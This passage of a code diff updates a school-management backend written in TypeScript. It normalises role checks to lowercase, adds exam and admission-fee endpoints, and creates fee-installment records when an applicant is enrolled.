 async function deleteNotice(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const notice = await prisma.notice.findFirst({ where: { id, schoolId: u.schoolId } });
   if (!notice) return err("Not found", 404, h);
   await prisma.notice.delete({ where: { id } });
@@ -2089,7 +2132,7 @@ async function getExams(req: Request, h: Headers): Promise<Response> {
 
 async function createExam(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body?.name || !body?.startDate || !body?.endDate) return err("name, startDate, endDate required", 400, h);
 
@@ -2110,11 +2153,65 @@ async function createExam(req: Request, h: Headers): Promise<Response> {
 
 async function updateExam(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const exam = await prisma.exam.findFirst({ where: { id, schoolId: u.schoolId } });
   if (!exam) return err("Not found", 404, h);
   const body = await req.json().catch(() => null);
   const updated = await prisma.exam.update({ where: { id }, data: { name: body?.name, status: body?.status, startDate: body?.startDate ? new Date(body.startDate) : undefined, endDate: body?.endDate ? new Date(body.endDate) : undefined } });
+  return json(updated, 200, h);
+}
+
+async function deleteExam(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
+  const exam = await prisma.exam.findFirst({ where: { id, schoolId: u.schoolId } });
+  if (!exam) return err("Not found", 404, h);
+  await prisma.exam.delete({ where: { id } });
+  return json({ ok: true }, 200, h);
+}
+
+async function getStudentExams(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchoolUser(req);
+  if (!u || u.role !== "student") return err("Unauthorized", 401, h);
+  const student = await prisma.student.findFirst({ where: { userId: u.id },
+    include: { enrollments: { where: { status: "ACTIVE" }, include: { section: { include: { grade: true } } }, take: 1 } } });
+  if (!student) return err("Student not found", 404, h);
+  const exams = await prisma.exam.findMany({
+    where: { schoolId: u.schoolId, status: { not: "CANCELLED" } },
+    include: { examSubjects: { include: { subject: true }, orderBy: { examDate: "asc" } } },
+    orderBy: { startDate: "asc" }, take: 20,
+  });
+  return json(exams, 200, h);
+}
+
+async function getTeacherExams(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchoolUser(req);
+  if (!u || u.role !== "teacher") return err("Unauthorized", 401, h);
+  const exams = await prisma.exam.findMany({
+    where: { schoolId: u.schoolId, status: { not: "CANCELLED" } },
+    include: { examSubjects: { include: { subject: true }, orderBy: { examDate: "asc" } } },
+    orderBy: { startDate: "asc" }, take: 20,
+  });
+  return json(exams, 200, h);
+}
+
+async function markAdmissionFee(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
+  const adm = await prisma.admission.findFirst({ where: { id, schoolId: u.schoolId } });
+  if (!adm) return err("Not found", 404, h);
+  const body = await req.json().catch(() => ({}));
+  const data: any = {};
+  if (body.preAdmissionPaid !== undefined) data.preAdmissionPaid = !!body.preAdmissionPaid;
+  if (body.admissionFeePaid !== undefined) data.admissionFeePaid = !!body.admissionFeePaid;
+  if (body.feeStructureId !== undefined) {
+    if (body.feeStructureId) {
+      const fs = await prisma.feeStructure.findFirst({ where: { id: body.feeStructureId, schoolId: u.schoolId } });
+      if (!fs) return err("Fee structure not found", 404, h);
+    }
+    data.feeStructureId = body.feeStructureId || null;
+  }
+  const updated = await prisma.admission.update({ where: { id }, data });
   return json(updated, 200, h);
 }
 
@@ -2127,7 +2224,7 @@ async function getSubjects(req: Request, h: Headers): Promise<Response> {
 
 async function createSubject(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body?.name || !body?.code) return err("name and code required", 400, h);
   const subject = await prisma.subject.create({ data: { schoolId: u.schoolId, name: body.name, code: body.code, creditHours: body.creditHours ?? 5, isElective: body.isElective ?? false, departmentId: body.departmentId ?? null } });
@@ -2136,7 +2233,7 @@ async function createSubject(req: Request, h: Headers): Promise<Response> {
 
 async function getSchoolSettings(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const school = await prisma.school.findUnique({ where: { id: u.schoolId }, include: { subscription: { include: { plan: true } }, academicYears: { where: { isActive: true } } } });
   if (!school) return err("Not found", 404, h);
   return json({ ...school, password: undefined }, 200, h);
@@ -2144,7 +2241,7 @@ async function getSchoolSettings(req: Request, h: Headers): Promise<Response> {
 
 async function updateSchoolSettings(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body) return err("No data", 400, h);
   const updated = await prisma.school.update({ where: { id: u.schoolId }, data: { phone: body.phone, altPhone: body.altPhone, email: body.email, website: body.website, principalName: body.principalName, principalPhone: body.principalPhone, address: body.address, city: body.city } });
@@ -2155,7 +2252,7 @@ async function updateSchoolSettings(req: Request, h: Headers): Promise<Response>
 
 async function teacherDashboard(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "TEACHER") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "teacher") return err("Unauthorized", 401, h);
 
   const teacher = await prisma.teacher.findFirst({ where: { userId: u.id }, include: { user: { include: { profile: true } } } });
   if (!teacher) return err("Teacher record not found", 404, h);
@@ -2185,7 +2282,7 @@ async function teacherDashboard(req: Request, h: Headers): Promise<Response> {
 
 async function getTeacherClasses(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "TEACHER") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "teacher") return err("Unauthorized", 401, h);
   const teacher = await prisma.teacher.findFirst({ where: { userId: u.id } });
   if (!teacher) return err("Teacher record not found", 404, h);
 
@@ -2209,7 +2306,7 @@ async function getTeacherClasses(req: Request, h: Headers): Promise<Response> {
 
 async function getAssignments(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "TEACHER") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "teacher") return err("Unauthorized", 401, h);
   const teacher = await prisma.teacher.findFirst({ where: { userId: u.id } });
   if (!teacher) return err("Teacher record not found", 404, h);
 
@@ -2222,7 +2319,7 @@ async function getAssignments(req: Request, h: Headers): Promise<Response> {
 
 async function createAssignment(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "TEACHER") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "teacher") return err("Unauthorized", 401, h);
   const teacher = await prisma.teacher.findFirst({ where: { userId: u.id } });
   if (!teacher) return err("Teacher record not found", 404, h);
   const body = await req.json().catch(() => null);
@@ -2235,7 +2332,7 @@ async function createAssignment(req: Request, h: Headers): Promise<Response> {
 
 async function studentDashboard(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "STUDENT") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "student") return err("Unauthorized", 401, h);
 
   const student = await prisma.student.findFirst({ where: { userId: u.id }, include: { user: { include: { profile: true } } } });
   if (!student) return err("Student record not found", 404, h);
@@ -2284,7 +2381,7 @@ async function studentDashboard(req: Request, h: Headers): Promise<Response> {
 
 async function getStudentAttendance(req: Request, h: Headers, url: URL): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "STUDENT") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "student") return err("Unauthorized", 401, h);
   const student = await prisma.student.findFirst({ where: { userId: u.id } });
   if (!student) return err("Not found", 404, h);
 
@@ -2295,7 +2392,7 @@ async function getStudentAttendance(req: Request, h: Headers, url: URL): Promise
 
 async function getStudentResults(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "STUDENT") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "student") return err("Unauthorized", 401, h);
   const student = await prisma.student.findFirst({ where: { userId: u.id } });
   if (!student) return err("Not found", 404, h);
 
@@ -2317,7 +2414,7 @@ async function getStudentResults(req: Request, h: Headers): Promise<Response> {
 
 async function getStudentFees(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "STUDENT") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "student") return err("Unauthorized", 401, h);
   const student = await prisma.student.findFirst({ where: { userId: u.id } });
   if (!student) return err("Not found", 404, h);
   const fees = await prisma.feeCollection.findMany({ where: { studentId: student.id }, include: { feeType: true }, orderBy: { dueDate: "desc" } });
@@ -2333,7 +2430,7 @@ async function getParentStudentIds(userId: string): Promise<string[]> {
 
 async function getParentResults(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "PARENT") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "parent") return err("Unauthorized", 401, h);
   const studentIds = await getParentStudentIds(u.id);
   if (studentIds.length === 0) return json([], 200, h);
 
@@ -2364,7 +2461,7 @@ async function getParentResults(req: Request, h: Headers): Promise<Response> {
 
 async function getParentAttendance(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "PARENT") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "parent") return err("Unauthorized", 401, h);
   const studentIds = await getParentStudentIds(u.id);
   if (studentIds.length === 0) return json([], 200, h);
 
@@ -2398,7 +2495,7 @@ async function getParentAttendance(req: Request, h: Headers): Promise<Response> 
 
 async function getParentFees(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "PARENT") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "parent") return err("Unauthorized", 401, h);
   const studentIds = await getParentStudentIds(u.id);
   if (studentIds.length === 0) return json([], 200, h);
 
@@ -2423,7 +2520,7 @@ async function getParentFees(req: Request, h: Headers): Promise<Response> {
 
 async function parentDashboard(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "PARENT") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "parent") return err("Unauthorized", 401, h);
 
   const parent = await prisma.parent.findFirst({ where: { userId: u.id }, include: { children: { include: { student: { include: { user: { include: { profile: true } }, enrollments: { where: { status: "ACTIVE" }, include: { section: { include: { grade: true } }, academicYear: true } }, attendances: { orderBy: { date: "desc" }, take: 30 }, feeCollections: { where: { status: { in: ["PENDING", "OVERDUE"] } } }, examResults: { orderBy: { createdAt: "desc" }, take: 5, include: { examSubject: { include: { subject: true } } } } } } } } } });
   if (!parent) return err("Parent record not found", 404, h);
@@ -2476,7 +2573,7 @@ async function getDepartments(req: Request, h: Headers): Promise<Response> {
 
 async function createDepartment(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body?.name) return err("name required", 400, h);
   const dept = await prisma.department.create({ data: { schoolId: u.schoolId, name: body.name, code: body.code ?? null, description: body.description ?? null, stream: body.stream ?? "OTHER" } });
@@ -2485,7 +2582,7 @@ async function createDepartment(req: Request, h: Headers): Promise<Response> {
 
 async function updateDepartment(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const dept = await prisma.department.findFirst({ where: { id, schoolId: u.schoolId } });
   if (!dept) return err("Not found", 404, h);
   const body = await req.json().catch(() => null);
@@ -2495,7 +2592,7 @@ async function updateDepartment(req: Request, h: Headers, id: string): Promise<R
 
 async function deleteDepartment(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const dept = await prisma.department.findFirst({ where: { id, schoolId: u.schoolId } });
   if (!dept) return err("Not found", 404, h);
   await prisma.department.delete({ where: { id } });
@@ -2523,7 +2620,7 @@ async function getLibraryBooks(req: Request, h: Headers, url: URL): Promise<Resp
 
 async function createLibraryBook(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body?.title) return err("title required", 400, h);
   const copies = body.totalCopies ?? 1;
@@ -2533,7 +2630,7 @@ async function createLibraryBook(req: Request, h: Headers): Promise<Response> {
 
 async function updateLibraryBook(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const book = await prisma.libraryBook.findFirst({ where: { id, schoolId: u.schoolId } });
   if (!book) return err("Not found", 404, h);
   const body = await req.json().catch(() => null);
@@ -2543,7 +2640,7 @@ async function updateLibraryBook(req: Request, h: Headers, id: string): Promise<
 
 async function deleteLibraryBook(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const book = await prisma.libraryBook.findFirst({ where: { id, schoolId: u.schoolId } });
   if (!book) return err("Not found", 404, h);
   await prisma.libraryBook.delete({ where: { id } });
@@ -2566,7 +2663,7 @@ async function getBookIssues(req: Request, h: Headers, url: URL): Promise<Respon
 
 async function issueBook(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body?.bookId || !body?.dueDate) return err("bookId and dueDate required", 400, h);
   const book = await prisma.libraryBook.findFirst({ where: { id: body.bookId, schoolId: u.schoolId } });
@@ -2581,7 +2678,7 @@ async function issueBook(req: Request, h: Headers): Promise<Response> {
 
 async function returnBook(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const issue = await prisma.bookIssue.findUnique({ where: { id } });
   if (!issue) return err("Issue not found", 404, h);
   if (issue.status === "RETURNED") return err("Already returned", 400, h);
@@ -2607,37 +2704,37 @@ async function getAdmissions(req: Request, h: Headers, url: URL): Promise<Respon
   if (status) where.status = status;
   if (search) where.OR = [{ firstName: { contains: search, mode: "insensitive" } }, { lastName: { contains: search, mode: "insensitive" } }, { phone: { contains: search, mode: "insensitive" } }, { applicationNo: { contains: search, mode: "insensitive" } }];
   const [admissions, total] = await Promise.all([
-    prisma.admission.findMany({ where, include: { grade: { select: { name: true } }, department: { select: { name: true } } }, orderBy: { appliedAt: "desc" }, skip: (page - 1) * 20, take: 20 }),
+    prisma.admission.findMany({ where, include: { grade: { select: { name: true } }, department: { select: { name: true } }, feeStructure: { select: { id: true, name: true, amount: true, installments: { select: { id: true, installmentNo: true, dueStage: true, label: true, amount: true } } } } }, orderBy: { appliedAt: "desc" }, skip: (page - 1) * 20, take: 20 }),
     prisma.admission.count({ where }),
   ]);
   const statusCounts = await prisma.admission.groupBy({ by: ["status"], where: { schoolId: u.schoolId }, _count: { status: true } });
-  return json({ admissions: admissions.map((a) => ({ ...a, name: `${a.firstName} ${a.lastName}`, gradeName: a.grade?.name ?? null, deptName: a.department?.name ?? null })), total, statusCounts: Object.fromEntries(statusCounts.map((s) => [s.status, s._count.status])) }, 200, h);
+  return json({ admissions: admissions.map((a) => ({ ...a, name: `${a.firstName} ${a.lastName}`, gradeName: a.grade?.name ?? null, deptName: a.department?.name ?? null, feeStructureName: a.feeStructure?.name ?? null })), total, statusCounts: Object.fromEntries(statusCounts.map((s) => [s.status, s._count.status])) }, 200, h);
 }
 
 async function createAdmission(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body?.firstName || !body?.lastName) return err("firstName and lastName required", 400, h);
   const count = await prisma.admission.count({ where: { schoolId: u.schoolId } });
   const applicationNo = `APP-${new Date().getFullYear()}-${String(count + 1).padStart(4, "0")}`;
-  const admission = await prisma.admission.create({ data: { schoolId: u.schoolId, applicationNo, firstName: body.firstName, lastName: body.lastName, email: body.email ?? null, phone: body.phone ?? null, gender: body.gender ?? null, dateOfBirth: body.dateOfBirth ? new Date(body.dateOfBirth) : null, address: body.address ?? null, gradeId: body.gradeId ?? null, departmentId: body.departmentId ?? null, previousSchool: body.previousSchool ?? null, guardianName: body.guardianName ?? null, guardianPhone: body.guardianPhone ?? null, notes: body.notes ?? null } });
+  const admission = await prisma.admission.create({ data: { schoolId: u.schoolId, applicationNo, firstName: body.firstName, lastName: body.lastName, email: body.email ?? null, phone: body.phone ?? null, gender: body.gender ?? null, dateOfBirth: body.dateOfBirth ? new Date(body.dateOfBirth) : null, address: body.address ?? null, gradeId: body.gradeId ?? null, departmentId: body.departmentId ?? null, previousSchool: body.previousSchool ?? null, guardianName: body.guardianName ?? null, guardianPhone: body.guardianPhone ?? null, notes: body.notes ?? null, transportRequired: !!body.transportRequired, busFee: body.busFee ? Number(body.busFee) : null, otherCharges: body.otherCharges ? Number(body.otherCharges) : null } });
   return json(admission, 201, h);
 }
 
 async function updateAdmission(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const adm = await prisma.admission.findFirst({ where: { id, schoolId: u.schoolId } });
   if (!adm) return err("Not found", 404, h);
   const body = await req.json().catch(() => null);
-  const updated = await prisma.admission.update({ where: { id }, data: { firstName: body?.firstName ?? adm.firstName, lastName: body?.lastName ?? adm.lastName, email: body?.email ?? adm.email, phone: body?.phone ?? adm.phone, gender: body?.gender ?? adm.gender, gradeId: body?.gradeId ?? adm.gradeId, departmentId: body?.departmentId ?? adm.departmentId, previousSchool: body?.previousSchool ?? adm.previousSchool, guardianName: body?.guardianName ?? adm.guardianName, guardianPhone: body?.guardianPhone ?? adm.guardianPhone, status: body?.status ?? adm.status, notes: body?.notes ?? adm.notes } });
+  const updated = await prisma.admission.update({ where: { id }, data: { firstName: body?.firstName ?? adm.firstName, lastName: body?.lastName ?? adm.lastName, email: body?.email ?? adm.email, phone: body?.phone ?? adm.phone, gender: body?.gender ?? adm.gender, gradeId: body?.gradeId !== undefined ? (body.gradeId || null) : adm.gradeId, departmentId: body?.departmentId !== undefined ? (body.departmentId || null) : adm.departmentId, feeStructureId: body?.feeStructureId !== undefined ? (body.feeStructureId || null) : adm.feeStructureId, previousSchool: body?.previousSchool ?? adm.previousSchool, guardianName: body?.guardianName ?? adm.guardianName, guardianPhone: body?.guardianPhone ?? adm.guardianPhone, status: body?.status ?? adm.status, notes: body?.notes ?? adm.notes, transportRequired: body?.transportRequired !== undefined ? !!body.transportRequired : adm.transportRequired, busFee: body?.busFee !== undefined ? (body.busFee === "" || body.busFee === null ? null : Number(body.busFee)) : adm.busFee, otherCharges: body?.otherCharges !== undefined ? (body.otherCharges === "" || body.otherCharges === null ? null : Number(body.otherCharges)) : adm.otherCharges } });
   return json(updated, 200, h);
 }
 
 async function deleteAdmission(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const adm = await prisma.admission.findFirst({ where: { id, schoolId: u.schoolId } });
   if (!adm) return err("Not found", 404, h);
   await prisma.admission.delete({ where: { id } });
@@ -2648,7 +2745,7 @@ async function deleteAdmission(req: Request, h: Headers, id: string): Promise<Re
 
 async function promoteStudents(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body?.fromYearId || !body?.toYearId || !body?.sectionMappings) return err("fromYearId, toYearId, and sectionMappings required", 400, h);
 
@@ -2676,7 +2773,7 @@ async function promoteStudents(req: Request, h: Headers): Promise<Response> {
 
 async function updateFeeStatus(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body?.status) return err("status required", 400, h);
   const fee = await prisma.feeCollection.findFirst({ where: { id, student: { schoolId: u.schoolId } } });
@@ -2700,7 +2797,7 @@ async function getExamSchedule(req: Request, h: Headers, examId: string): Promis
 
 async function upsertExamSubject(req: Request, h: Headers, examId: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const exam = await prisma.exam.findFirst({ where: { id: examId, schoolId: u.schoolId } });
   if (!exam) return err("Exam not found", 404, h);
   const body = await req.json().catch(() => null);
@@ -2744,7 +2841,7 @@ async function upsertExamSubject(req: Request, h: Headers, examId: string): Prom
 
 async function deleteExamSubject(req: Request, h: Headers, examSubjectId: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const es = await prisma.examSubject.findUnique({ where: { id: examSubjectId }, include: { exam: { select: { schoolId: true } } } });
   if (!es || es.exam.schoolId !== u.schoolId) return err("Not found", 404, h);
   await prisma.examSubject.delete({ where: { id: examSubjectId } });
@@ -2796,6 +2893,12 @@ async function syncOccupied(sectionId: string): Promise<void> {
 async function transportFeeType(schoolId: string) {
   let ft = await prisma.feeType.findFirst({ where: { schoolId, name: "Transport" } });
   if (!ft) ft = await prisma.feeType.create({ data: { schoolId, name: "Transport", description: "Bus / transport fee", isRecurring: true } });
+  return ft;
+}
+
+async function tuitionFeeType(schoolId: string) {
+  let ft = await prisma.feeType.findFirst({ where: { schoolId, name: "Admission / Tuition" } });
+  if (!ft) ft = await prisma.feeType.create({ data: { schoolId, name: "Admission / Tuition", description: "Admission / tuition fee charged at enrollment", isRecurring: false } });
   return ft;
 }
 
@@ -2886,7 +2989,7 @@ async function getStudentDetail(req: Request, h: Headers, id: string): Promise<R
 
 async function allocateStudentSection(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const student = await prisma.student.findFirst({ where: { id, schoolId: u.schoolId } });
   if (!student) return err("Student not found", 404, h);
   const body = await req.json().catch(() => null);
@@ -2938,7 +3041,7 @@ async function getBusRoutes(req: Request, h: Headers): Promise<Response> {
 
 async function createBus(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body?.numberPlate || String(body.numberPlate).trim() === "") return err("Number plate is required", 400, h);
   const bus = await prisma.bus.create({ data: {
@@ -2950,7 +3053,7 @@ async function createBus(req: Request, h: Headers): Promise<Response> {
 
 async function updateBus(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const bus = await prisma.bus.findFirst({ where: { id, schoolId: u.schoolId } });
   if (!bus) return err("Not found", 404, h);
   const body = await req.json().catch(() => null);
@@ -2964,7 +3067,7 @@ async function updateBus(req: Request, h: Headers, id: string): Promise<Response
 
 async function deleteBus(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const bus = await prisma.bus.findFirst({ where: { id, schoolId: u.schoolId } });
   if (!bus) return err("Not found", 404, h);
   await prisma.bus.delete({ where: { id } });
@@ -2973,7 +3076,7 @@ async function deleteBus(req: Request, h: Headers, id: string): Promise<Response
 
 async function createBusRoute(req: Request, h: Headers, busId: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const bus = await prisma.bus.findFirst({ where: { id: busId, schoolId: u.schoolId } });
   if (!bus) return err("Bus not found", 404, h);
   const body = await req.json().catch(() => null);
@@ -2989,7 +3092,7 @@ async function createBusRoute(req: Request, h: Headers, busId: string): Promise<
 
 async function updateBusRoute(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const route = await prisma.busRoute.findFirst({ where: { id, bus: { schoolId: u.schoolId } } });
   if (!route) return err("Not found", 404, h);
   const body = await req.json().catch(() => null);
@@ -3004,7 +3107,7 @@ async function updateBusRoute(req: Request, h: Headers, id: string): Promise<Res
 
 async function deleteBusRoute(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const route = await prisma.busRoute.findFirst({ where: { id, bus: { schoolId: u.schoolId } } });
   if (!route) return err("Not found", 404, h);
   await prisma.busRoute.delete({ where: { id } });
@@ -3015,10 +3118,15 @@ async function deleteBusRoute(req: Request, h: Headers, id: string): Promise<Res
 
 async function enrollAdmission(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
-  const adm = await prisma.admission.findFirst({ where: { id, schoolId: u.schoolId } });
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
+  const adm = await prisma.admission.findFirst({ where: { id, schoolId: u.schoolId }, include: { feeStructure: { include: { installments: true } } } });
   if (!adm) return err("Application not found", 404, h);
   if (adm.status === "ENROLLED") return err("This applicant is already enrolled", 400, h);
+
+  // If a fee structure is assigned, require both pre-admission and admission fees to be marked paid before enrolling.
+  if (adm.feeStructureId && (!adm.preAdmissionPaid || !adm.admissionFeePaid)) {
+    return err("Pre-admission and admission fees must be marked as paid before enrollment", 400, h);
+  }
 
   const body = await req.json().catch(() => ({}));
   const email = body.email ?? adm.email ?? `${adm.applicationNo.toLowerCase()}@student.local`;
@@ -3026,7 +3134,8 @@ async function enrollAdmission(req: Request, h: Headers, id: string): Promise<Re
   const existing = await prisma.user.findUnique({ where: { schoolId_email: { schoolId: u.schoolId, email } } });
   if (existing) return err("A user with this email already exists in this school", 400, h);
 
-  const password = await Bun.password.hash(body.password ?? "changeme123");
+  const plainPassword = body.password?.trim() || generatePassword(adm.firstName);
+  const password = await Bun.password.hash(plainPassword);
   const admissionNo = body.admissionNo ?? `ADM-${Date.now().toString().slice(-6)}`;
 
   const student = await prisma.student.create({
@@ -3046,16 +3155,45 @@ async function enrollAdmission(req: Request, h: Headers, id: string): Promise<Re
     }
   }
 
+  // Admission / tuition fee charged at enrollment (NPR) — manual override.
+  if (Number(body.feeAmount) > 0) {
+    const ft = await tuitionFeeType(u.schoolId);
+    await prisma.feeCollection.create({ data: { studentId: student.id, feeTypeId: ft.id, academicYearId: await activeYearId(u.schoolId), amountDue: Number(body.feeAmount), dueDate: body.feeDueDate ? new Date(body.feeDueDate) : new Date(), status: "PENDING", remarks: body.feeRemarks?.trim() || "Admission fee" } });
+  }
+
+  // Auto-apply fee structure installments (skip pre-admission and admission which are already paid).
+  if (adm.feeStructure && adm.feeStructure.installments.length > 0) {
+    const ft = await tuitionFeeType(u.schoolId);
+    const ayId = await activeYearId(u.schoolId);
+    const PRE_ADM_STAGES = ["pre-admission", "pre_admission", "preadmission", "registration"];
+    const ADM_STAGES = ["admission"];
+    for (const inst of adm.feeStructure.installments) {
+      const stage = (inst.dueStage ?? "").toLowerCase();
+      if (PRE_ADM_STAGES.includes(stage) || ADM_STAGES.includes(stage)) continue; // already paid
+      const dueDate = inst.dueDay ? (() => { const d = new Date(); d.setDate(inst.dueDay!); return d; })() : new Date();
+      await prisma.feeCollection.create({ data: { studentId: student.id, feeTypeId: ft.id, academicYearId: ayId, amountDue: Number(inst.amount), dueDate, status: "PENDING", remarks: inst.label ?? inst.dueStage ?? `Installment #${inst.installmentNo}` } });
+    }
+  } else if (adm.feeStructure && Number(adm.feeStructure.amount) > 0 && Number(body.feeAmount) === 0) {
+    // No installments — charge the base amount if no manual override given.
